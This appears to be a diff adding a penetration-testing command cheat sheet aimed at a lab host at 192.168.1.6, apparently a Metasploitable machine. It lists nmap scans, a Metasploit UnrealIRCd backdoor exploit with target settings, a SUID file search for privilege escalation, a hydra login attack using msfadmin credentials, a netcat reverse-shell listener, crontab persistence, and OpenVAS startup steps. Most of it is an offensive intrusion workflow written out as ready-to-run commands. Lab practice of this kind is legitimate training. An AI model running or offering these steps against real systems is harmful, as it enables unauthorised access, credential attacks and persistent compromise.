@@ -1,1 +1,49 @@
+# ========================
+# NMAP SCANNING
+# ========================
+nmap -sS 192.168.1.6
+nmap -A 192.168.1.6
 
+# ========================
+# METASPLOIT
+# ========================
+msfconsole
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOST 192.168.1.6
+exploit
+
+# ========================
+# PRIVILEGE ESCALATION
+# ========================
+find / -perm -4000 2>/dev/null
+whoami
+
+# ========================
+# HYDRA
+# ========================
+hydra -l msfadmin -p msfadmin ftp://192.168.1.6
+
+# ========================
+# REVERSE SHELL
+# ========================
+nc -lvnp 4444
+
+# ========================
+# PERSISTENCE
+# ========================
+crontab -e
+
+# ========================
+# OPENVAS
+# ========================
+gvm-check-setup
+sudo systemctl start redis-server
+sudo systemctl start ospd-openvas
+sudo systemctl start gvmd
+sudo systemctl start gsad
+
+# Access Web UI
+https://127.0.0.1:9392
+
+# Rebuild configs (if needed)
+sudo -u _gvm gvmd --rebuild-gvmd-data=all
